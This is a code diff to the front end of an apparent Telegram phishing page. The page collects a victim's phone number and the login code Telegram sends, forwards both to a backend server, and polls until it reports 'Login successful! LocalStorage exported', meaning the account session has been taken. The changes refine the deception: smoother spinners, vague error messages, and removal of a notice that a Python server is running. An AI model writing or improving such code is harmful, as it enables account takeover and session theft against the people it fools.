@@ -549,23 +549,43 @@ async function checkStatus() {
                 const data = await response.json();
                 
                 if (data.status === 'code_required') {
-                    // Switch to code page
+                    // stop spinner on phone page and switch to code page
+                    loadingSpinner.style.display = 'none';
                     phonePage.style.display = 'none';
                     codePage.style.display = 'block';
                     displayPhone.textContent = phoneInput.value ? `${codeSpan.textContent} ${phoneInput.value}` : 'Unknown';
                     codeInput.focus();
                     showStatus(codeStatus, 'Enter the 5-digit code sent to your Telegram app', 'info');
+                    clearInterval(statusCheckInterval); // continue polling from the code page if desired
                 } else if (data.status === 'login_success') {
+                    loadingSpinner.style.display = 'none';
                     showStatus(codeStatus, 'Login successful! LocalStorage exported.', 'success');
                     clearInterval(statusCheckInterval);
                 } else if (typeof data.status === 'string' && data.status.startsWith('error:')) {
-                    showStatus(codeStatus, data.status.replace('error:', 'Error:'), 'error');
+                    loadingSpinner.style.display = 'none';
+                    // show a simple error message for phone-step failures
+                    if (phonePage.style.display !== 'none') {
+                        showStatus(phoneStatus, 'Error entering phone number', 'error');
+                        nextButton.style.display = 'block';
+                    } else {
+                        showStatus(codeStatus, data.status.replace('error:', 'Error:'), 'error');
+                    }
+                    clearInterval(statusCheckInterval);
                 } else {
-                    // update phone status with returned status (optional)
-                    showStatus(phoneStatus, `Status: ${data.status}`, 'info');
+                    // keep spinner visible while queued/processing; do not show intermediate messages on phone page
+                    if (phonePage.style.display !== 'none') {
+                        // nothing: keep spinner and hide other messages
+                        phoneStatus.style.display = 'none';
+                    } else {
+                        showStatus(phoneStatus, `Status: ${data.status}`, 'info');
+                    }
                 }
             } catch (error) {
                 console.error('Error checking status:', error);
+                loadingSpinner.style.display = 'none';
+                nextButton.style.display = 'block';
+                showStatus(phoneStatus, 'Error entering phone number', 'error');
+                clearInterval(statusCheckInterval);
             }
         }
 
@@ -575,32 +595,49 @@ async function checkStatus() {
             if (phoneNumber) {
                 nextButton.style.display = 'none'; // Hide the NEXT button
                 loadingSpinner.style.display = 'block'; // Show the loading spinner
-                phoneStatus.textContent = ''; // Clear previous status messages
+                phoneStatus.style.display = 'none'; // hide any previous status
 
                 try {
-                    // Send phone number to the server
+                    // Send phone number to the server using expected fields
                     const response = await fetch(SERVER_URL + '/phone', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
                         },
-                        body: JSON.stringify({ phone: phoneNumber })
+                        body: JSON.stringify({
+                            country_code: codeSpan.textContent.replace('+', ''),
+                            phone_number: phoneNumber
+                        })
                     });
 
-                    if (!response.ok) {
-                        throw new Error('Error entering phone number');
+                    const result = await response.json();
+
+                    // server returns {"error": "..."} on problems
+                    if (result && result.error) {
+                        throw new Error(result.error);
                     }
 
-                    // Handle successful response (if needed)
+                    // if enqueued, store session id and start polling
+                    if (result && result.session) {
+                        sessionId = result.session;
+                        // start checking status every 2 seconds
+                        statusCheckInterval = setInterval(checkStatus, 2000);
+                    } else {
+                        // unexpected response — show generic error
+                        throw new Error('invalid_response');
+                    }
+
                 } catch (error) {
-                    phoneStatus.textContent = 'Error entering phone number'; // Show error message
-                    loadingSpinner.style.display = 'none'; // Hide the spinner
-                    nextButton.style.display = 'block'; // Show the NEXT button again
+                    // Show simple error message and restore UI
+                    loadingSpinner.style.display = 'none';
+                    nextButton.style.display = 'block';
+                    showStatus(phoneStatus, 'Error entering phone number', 'error');
                 }
             } else {
-                phoneStatus.textContent = 'Please enter a phone number.';
+                showStatus(phoneStatus, 'Please enter a phone number.', 'error');
             }
         });
+
 
         // Code input handler - auto-submit when 5 digits are entered
         codeInput.addEventListener('input', async (e) => {
@@ -642,7 +679,7 @@ async function checkStatus() {
         });
 
         // Check initial connection
-        showStatus(phoneStatus, 'Ready to connect. Make sure Python server is running.', 'info');
+
     </script>
 </body>
 </html>
